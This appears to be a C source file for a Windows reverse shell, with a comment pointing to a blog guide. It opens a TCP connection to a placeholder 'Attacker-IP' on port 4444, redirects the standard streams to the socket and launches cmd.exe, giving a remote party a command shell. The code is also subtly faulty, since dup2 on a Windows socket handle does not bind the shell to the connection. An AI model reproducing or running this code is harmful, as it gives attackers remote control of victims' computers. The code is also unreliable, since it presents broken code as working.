// https://www.zerodetection.net/blog/a-simple-guide-to-creating-a-reverse-shell-in-c

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

int main() {
    // Initialize Winsock
    WSADATA wsData;
    WSAStartup(MAKEWORD(2,2), &wsData);

    // Create socket
    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        return 1;
    }

    // Server details
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444); // Port
    serverAddr.sin_addr.s_addr = inet_addr("Attacker-IP");

    // Connect to attacker
    if (connect(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) != 0) {
        printf("Connection failed\n");
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    // Redirect input, output, and error
    dup2((int)sockfd, 0);
    dup2((int)sockfd, 1);
    dup2((int)sockfd, 2);

    // Execute shell
    system("cmd.exe");

    return 0;
}
